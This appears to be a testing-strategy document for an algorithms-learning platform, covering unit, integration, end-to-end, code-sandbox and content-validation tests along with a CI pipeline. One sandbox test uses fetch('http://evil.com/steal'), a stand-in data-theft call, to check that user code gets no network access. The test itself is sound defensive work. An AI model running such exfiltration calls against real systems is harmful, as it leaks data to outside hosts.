# DSA Mastery Platform - Testing Strategy

## Testing Pyramid

```
         ▲
        / \     E2E Tests (Critical User Flows)
       /---\    
      /-----\   Integration Tests (API + DB)
     /-------\ 
    /---------\ Unit Tests (Domain Logic, Algorithms)
   /-----------\
  /-------------\
```

---

## Unit Tests (Target: 80% coverage on domain logic)

### What to Test
- Domain entities (validation, business rules)
- Complexity calculations
- Mastery score computation
- Template marker parsing
- Curriculum graph algorithms (topological sort, prerequisite resolution)
- Pattern recognition signal matching
- AI prompt construction

### What NOT to Test
- Getters/setters
- JPA entity mappings (tested via integration tests)
- Framework code

### Tools
- **JUnit 5** + **AssertJ**
- **Mockito** for mocking external dependencies
- **Parameterized tests** for algorithm variations

### Example
```java
@Test
void masteryScore_calculatesCorrectly() {
    MasteryRecord record = MasteryRecord.builder()
        .viewed(true)
        .explanationViewed(true)
        .templateViewed(true)
        .attempts(3)
        .passedTests(true)
        .solutionRevealed(false)
        .optimalUnderstood(true)
        .variationsAttempted(true)
        .build();
    
    int score = masteryService.calculateScore(record);
    
    assertThat(score).isEqualTo(85); // transparent formula
}
```

---

## Integration Tests (Target: All API endpoints)

### What to Test
- REST controller request/response mapping
- JPA repository queries
- Database constraints and migrations
- Transaction boundaries
- OpenAPI spec compliance

### Tools
- **Spring Boot Test** + **Testcontainers (PostgreSQL)**
- **REST Assured** or **MockMvc**
- **Flyway** for migration testing

### Testcontainers Configuration
```java
@SpringBootTest
@Testcontainers
class ProblemControllerIntegrationTest {
    
    @Container
    static PostgreSQLContainer<?> postgres = new PostgreSQLContainer<>("postgres:16-alpine")
        .withDatabaseName("dsa_mastery_test")
        .withUsername("test")
        .withPassword("test");
    
    @DynamicPropertySource
    static void configure(DynamicPropertyRegistry registry) {
        registry.add("spring.datasource.url", postgres::getJdbcUrl);
        registry.add("spring.datasource.username", postgres::getUsername);
        registry.add("spring.datasource.password", postgres::getPassword);
    }
    
    @Autowired MockMvc mvc;
    
    @Test
    void getProblem_returnsChapterWithAllSections() {
        // Given: problem with patterns, solutions, test cases in DB
        // When: GET /api/v1/problems/two-sum
        // Then: 200 with complete chapter structure
    }
}
```

---

## End-to-End Tests (Target: Critical Learning Flows)

### Critical Flows
1. **Browse Curriculum → Select Problem → View Chapter**
2. **View Pattern → See Related Problems → Navigate**
3. **Write Code → Run Tests → See Results**
4. **Get Hint → Receive Socratic Question**
5. **Submit Solution → Get Review Feedback**
6. **Track Mastery → See Progress Update**

### Tools
- **Playwright** (TypeScript) for browser automation
- Run against built frontend + backend in Docker

### Example
```typescript
// e2e/learning-flow.spec.ts
test('learner solves two-sum problem', async ({ page }) => {
  await page.goto('/curriculum');
  await page.click('text=Two Sum');
  
  await expect(page.locator('h1')).toContainText('Two Sum');
  await page.click('tab=Playground');
  
  await page.fill('[data-testid=editor]', twoSumSolution);
  await page.click('button:has-text("Run Tests")');
  
  await expect(page.locator('[data-testid=test-results]')).toContainText('All 15 tests passed');
  
  await page.click('tab=Mastery');
  await expect(page.locator('[data-testid=mastery-status]')).toContainText('SOLVED');
});
```

---

## Code Execution Tests

### Sandbox Behavior Tests
```java
@SpringBootTest
@Testcontainers
class CodeExecutionIntegrationTest {
    
    @Container
    static GenericContainer<?> runner = new GenericContainer<>("dsa-runner-typescript:latest")
        .withExposedPorts(2376); // Docker socket not needed, just image
    
    @Test
    void typescript_correctSolution_passesAllTests() {
        ExecutionResult result = executionService.execute(
            "function twoSum(nums, target) { ... }",
            Language.TYPESCRIPT,
            testCases
        );
        
        assertThat(result.status()).isEqualTo(ExecutionStatus.PASSED);
        assertThat(result.passedTests()).isEqualTo(15);
    }
    
    @Test
    void typescript_infiniteLoop_timesOut() {
        ExecutionResult result = executionService.execute(
            "function twoSum() { while(true) {} }",
            Language.TYPESCRIPT,
            testCases
        );
        
        assertThat(result.status()).isEqualTo(ExecutionStatus.TIMEOUT);
    }
    
    @Test
    void python_memoryExhaustion_oomKilled() {
        ExecutionResult result = executionService.execute(
            "def twoSum(): x = [0] * 10**9",
            Language.PYTHON,
            testCases
        );
        
        assertThat(result.status()).isEqualTo(ExecutionStatus.ERROR);
    }
    
    @Test
    void noNetworkAccess_blocked() {
        ExecutionResult result = executionService.execute(
            "fetch('http://evil.com/steal')",
            Language.JAVASCRIPT,
            testCases
        );
        
        assertThat(result.status()).isEqualTo(ExecutionStatus.ERROR);
    }
}
```

---

## Content Validation Tests

### Automated Content Validation (CI Gate)
```java
@Component
public class ContentValidator {
    
    public ValidationReport validateProblem(ProblemContent content) {
        ValidationReport report = new ValidationReport();
        
        // 1. Frontmatter schema validation
        validateFrontmatter(content.problem(), report);
        
        // 2. Cross-reference validation
        validateReferences(content, report);
        
        // 3. Solution compilation
        for (Solution s : content.solutions()) {
            CompilationResult compile = compiler.compile(s.code(), s.language());
            report.addErrors(compile.errors());
        }
        
        // 4. Test execution
        for (Solution s : content.solutions()) {
            ExecutionResult exec = executor.execute(s.code(), s.language(), content.testCases());
            if (exec.status() != PASSED) {
                report.addError("Solution fails tests: " + exec.error());
            }
        }
        
        // 5. Complexity verification (performance tests)
        for (Solution s : content.solutions()) {
            if (s.hasPerformanceTests()) {
                verifyComplexity(s, report);
            }
        }
        
        // 6. Template mapping accuracy
        validateTemplateMappings(content, report);
        
        return report;
    }
}
```

### Content Test Runner (CI)
```bash
# Run in CI pipeline
./gradlew contentValidationTest
```

---

## Frontend Tests

### Component Tests (React Testing Library + Vitest)
- Curriculum tree rendering
- Problem chapter sections
- Code editor integration (Monaco)
- Graph visualization (React Flow)
- AI tutor panel interactions
- Mastery progress display

### Example
```typescript
// components/ProblemChapter.test.tsx
import { render, screen, fireEvent } from '@testing-library/react';
import { ProblemChapter } from './ProblemChapter';

test('shows worst→better→best solutions in order', () => {
  render(<ProblemChapter problem={mockProblem} />);
  
  const approaches = screen.getAllByTestId('solution-approach');
  expect(approaches[0]).toHaveTextContent('WORST');
  expect(approaches[1]).toHaveTextContent('BETTER');
  expect(approaches[2]).toHaveTextContent('BEST');
});

test('template markers map to solution code', () => {
  render(<ProblemChapter problem={mockProblem} />);
  
  fireEvent.click(screen.getByText('Show Template Mapping'));
  
  expect(screen.getByText('[1]')).toBeInTheDocument();
  expect(screen.getByText('Initialize left pointer')).toBeInTheDocument();
});
```

---

## Test Data Management

### Test Fixtures
```java
// test-fixtures/src/main/java/.../TestFixtures.java
public class TestFixtures {
    public static Problem twoSum() {
        return Problem.builder()
            .slug("two-sum")
            .title("Two Sum")
            .difficulty(Difficulty.EASY)
            .patterns(List.of(pattern("hash-map"), pattern("two-pointer")))
            .solutions(List.of(
                solution("Brute Force", Approach.WORST, "O(n²)", "O(1)"),
                solution("Hash Map", Approach.BEST, "O(n)", "O(n)")
            ))
            .testCases(List.of(
                testCase("Basic", "[2,7,11,15], 9", "[0,1]"),
                testCase("Edge: Duplicates", "[3,3], 6", "[0,1]")
            ))
            .build();
    }
}
```

### Database Seeding for Tests
- Use `@Sql` scripts for integration tests
- Testcontainers starts fresh DB per test class
- Flyway migrations run automatically

---

## CI/CD Pipeline

```yaml
# .github/workflows/test.yml
jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { java-version: '21', distribution: 'temurin' }
      - run: ./gradlew test --info
  
  integration-tests:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16-alpine
        env: { POSTGRES_DB: test, POSTGRES_USER: test, POSTGRES_PASSWORD: test }
        ports: [5432:5432]
    steps:
      - run: ./gradlew integrationTest
  
  content-validation:
    runs-on: ubuntu-latest
    steps:
      - run: ./gradlew contentValidationTest
  
  frontend-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20' }
      - run: cd frontend && npm ci && npm run test
  
  e2e-tests:
    runs-on: ubuntu-latest
    needs: [integration-tests, frontend-tests]
    steps:
      - run: docker compose -f docker-compose.test.yml up -d
      - run: cd frontend && npx playwright install && npx playwright test
```

---

## Performance Benchmarks (Not Unit Tests)

### Execution Sandbox Benchmarks
- Cold start latency per language
- Warm container reuse
- Memory overhead per execution
- Concurrent execution limits

### API Benchmarks
- Problem chapter load time (< 200ms p95)
- Curriculum tree load time (< 100ms)
- Search response time (< 150ms)

---

## Test Commands

```bash
# Backend
./gradlew test                    # Unit tests
./gradlew integrationTest         # Integration tests (Testcontainers)
./gradlew contentValidationTest   # Content validation

# Frontend
cd frontend && npm run test       # Unit + component tests
cd frontend && npm run test:e2e   # Playwright E2E

# All
docker compose -f docker-compose.test.yml up --abort-on-container-exit
```

---

## Quality Gates

| Check | Threshold |
|-------|-----------|
| Unit test coverage (domain) | ≥ 80% |
| Integration test pass rate | 100% |
| Content validation | 0 errors |
| E2E critical flows | 100% pass |
| No flaky tests | 0 |
| Build time | < 10 min |